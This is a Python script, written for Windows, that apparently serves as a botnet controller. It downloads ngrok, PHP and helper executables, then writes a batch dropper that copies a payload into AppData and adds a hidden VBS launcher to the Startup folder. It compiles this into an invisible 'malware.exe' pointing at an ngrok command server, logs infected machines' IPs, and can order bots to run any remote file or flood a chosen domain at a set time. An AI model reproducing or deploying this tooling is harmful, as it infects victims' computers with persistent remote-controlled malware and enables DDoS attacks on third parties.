#works for windows operating system

from os import system
from os.path import exists
from sys import exit
from os import chdir



def sys_check():
    if exists('files'):main()
    else:setup()



def banner():
    print('''
    
    ⣿⡏⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿
    ⣿⣿⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⣿
    ⣿⣿⣧⡀⠀⠀⠀⠀⠙⠿⠿⠿⠻⠿⠿⠟⠿⠛⠉⠀⠀⠀⠀⠀⣸⣿
    ⣿⣿⣿⣷⣄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿
    ⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣴⣿⣿⣿⣿
    ⣿⣿⣿⣿⡟⠀⠀⢰⣹⡆⠀⠀⠀⠀⠀⠀⣭⣷⠀⠀⠀⠸⣿⣿⣿⣿
    ⣿⣿⣿⣿⠃⠀⠀⠈⠉⠀⠀⠤⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⢿⣿⣿⣿
    ⣿⣿⣿⣿⢾⣿⣷⠀⠀⠀⠀⡠⠤⢄⠀⠀⠀⠠⣿⣿⣷⠀⢸⣿⣿⣿
    ⣿⣿⣿⣿⡀⠉⠀⠀⠀⠀⠀⢄⠀⢀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿
    ⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿
    ⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
    
    ''')




def setup():#working
    system('cls')

    banner()

    #make folders
    print('\nSetting up file systems...')
    system('mkdir files')
    chdir('files')
    
    print('Downloading nessesary files...')    
    #download zip files
    #downloading ngrok
    system('curl https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip --output ngrok.zip')
    
    #downloading PHP from official site
    system('curl https://windows.php.net/downloads/releases/php-7.4.29-Win32-vc15-x86.zip --output php.zip')
    
    #downloading bat2exe zipped
    system('curl https://github.com/canosaur/botnet-controller/raw/main/b2e.exe --output b2e.exe')
    
    #downloading hammer.zip(exe)
    system('curl https://github.com/canosaur/botnet-controller/raw/main/ham.exe --output ham.exe')
    
    #downloading win.zip(exe)
    system('curl https://github.com/canosaur/botnet-controller/raw/main/win.exe --output win.exe')
    
    
    #make `self-make` files
    #to run ngrok in background
    open('ngrok.vbs','w').write('Set oShell = CreateObject ("Wscript.Shell")\nDim strArgs\nstrArgs = "cmd /c ngrok.exe http 8080"\noShell.Run strArgs, 0, false')

    #to run php in background
    open('php.vbs','w').write('Set oShell = CreateObject ("Wscript.Shell")\nDim strArgs\nstrArgs = "cmd /c php.exe -S localhost:8080"\noShell.Run strArgs, 0, false')
    
    #the setup file which downloads further malware into the victim's computer
    open('setup.bat','w').write('echo win.exe URL > "%appdata%\\Microsoft\\Windows\\Templates\\win.bat"\necho Set oShell = CreateObject ("Wscript.Shell") > win.vbs\necho Dim strArgs >> win.vbs\necho strArgs = "cmd /c %appdata%\\Microsoft\\Windows\\Templates\\win.bat" >> win.vbs\necho oShell.Run strArgs, 0, false >> win.vbs\n\nmove win.vbs "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"\nmove win.exe "%appdata%\\Microsoft\\Windows\\Templates\\"')
    
    #php file to fetch jobs file to bots
    open('index.php','w').write("<?php\ninclude 'ip.php';\nheader('Location: jobs');\nexit\n?>\n")

    #php file to get bots ip and store it which can be further used to check how many bots in the botnet
    open('ip.php','w').write('<?php\n\nif (!empty($_SERVER[\'HTTP_CLIENT_IP\']))\n    {\n      $ipaddress = $_SERVER[\'HTTP_CLIENT_IP\']."\\r\\n";\n    }\nelseif (!empty($_SERVER[\'HTTP_X_FORWARDED_FOR\']))\n    {\n      $ipaddress = $_SERVER[\'HTTP_X_FORWARDED_FOR\']."\\r\\n";\n    }\nelse\n    {\n      $ipaddress = $_SERVER[\'REMOTE_ADDR\']."\\r\\n";\n    }\n$useragent = " User-Agent: ";\n$browser = $_SERVER[\'HTTP_USER_AGENT\'];\n\n\n$file = \'bots\';\n$victim = "IP: ";\n$fp = fopen($file, \'a\');\n\nfwrite($fp, $victim);\nfwrite($fp, $ipaddress);\nfwrite($fp, $useragent);\nfwrite($fp, $browser);\n\n\nfclose($fp);\n')
    
    open('bots','w').write('')

    
    print('Extracting files...')

    system('tar -xf ngrok.zip')
    system('tar -xf php.zip')
    system('del php.zip')
    system('del ngrok.zip')

    print('Completed setup!')
    
    system('ngrok.exe authtoken ' + input('Enter ngrok auth token: '))
    print('Setup done! You can now start using botnet controller')
    system('pause')
    main()




def main():#working

    system('cls')
    
    banner()

    system('tasklist | findstr "ngrok" >a ')
    if 'ngrok' in open('a').read():print('Server running')
    print(
        '''
        [1] Check number of bot computers
        [2] Create botnet malware
        [3] Use botnet
        [4] Kill server
        [5] Exit
        '''
        )


    option = input('Enter option: ')

    if   option == '1': check()#done
    elif option == '2': make()#done
    elif option == '3': use()#done
    elif option == '4':
        system('taskkill /f /im ngrok*')
        system('taskkill /f /im php*')
        main()
    elif option == '5': exit()
    else:
        print('[!] Invalid option [!]')
        system('pause')
        main()




def use():#working
    print(
        '''
        [1] DDoS attacks
        [2] Runs a custom file'''
#        [3] Openbullet cracking
#        '''
        )
    a = input('Enter option: ')
    if a == '1':DDoS()
    elif a == '2':custom()
    #elif a == '3':
     #   openbullet()
    else:
        print('Invalid option')
        system('pause')
        main()




def custom():#working
    open('jobs','w').write('c '+input('Enter the URL of the file you want the bots to run '))
    print('Data added to bot jobs')
    system('pause')
    main()




def openbullet():#later
    1




def check():#working

    print('\nBelow is a list of bots based on their IPs\n')
    print(open('bots').read()+'\n')
    system('pause')
    main()




def make():#working
    print('Starting server...')
    system('start php.vbs')
    print('Forwarding port...')
    system('start ngrok.vbs')
    system('timeout /nobreak /t 5 > nul')
    
    print('Finding ngrok link...')
    system('curl localhost:4040/api/tunnels >a ')
    lnk = open('a').read().split('"')
    ngrok_link = lnk[17]

    print('Adding ngrok URL to malware...')
    
    a = open('setup.bat').read().replace('URL',ngrok_link)
    open('setup.exe.bat','w').write(a)

    print('Compiling malware...')
    system('b2e.exe /bat setup.exe.bat /exe malware.exe /invisible /include win.exe /overwrite')

    print('Compilation of file completed, moving file to desktop..')
    system(r'move malware.exe %userprofile%\Desktop')
    
    print('''
    WARNING: Shutting down this computer will shutdown the server also if you are using a free
    ngrok account. Shutdown only if are sure with server shutdown.
    ''')

    system('pause')
    system('del setup.exe.bat a')
    
    main()



def DDoS():#completed
    print('[!] Packet flood attack will be done on the target domain [!]')
    u = input('Enter domain to attack: ')
    d = input('Enter date on which DDoS should happen(format=YY-MM-DD,eg=2020-01-01): ')
    t = input('What time should DDoS attack start? (format=24Hour,eg=13:30): ')
    e = input('What time should DDoS attack end? (format=24Hour,eg=14:30): ')
    
    if (u != '' and d !='' and t != '' and e != ''):
        open('jobs','w').write('d '+u+' '+d+' '+t+' '+e)
        print('Data added to bot jobs')
        system('pause')
    else:
        print('Data incomplete!')
        system('pause')




sys_check()
